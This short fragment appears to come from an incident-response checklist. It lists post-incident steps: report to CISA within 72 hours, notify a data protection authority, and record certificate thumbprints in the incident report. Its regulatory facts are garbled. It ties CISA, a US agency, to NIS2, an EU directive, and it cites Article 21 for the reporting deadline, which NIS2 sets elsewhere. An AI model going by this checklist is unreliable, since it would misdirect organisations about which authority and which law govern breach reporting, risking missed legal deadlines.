- Report to **CISA** within **72 hours** (NIS2 Art. 21)
- Notify **Data Protection Authority** (country-specific)
- Document certificate thumbprints in incident report for tracking
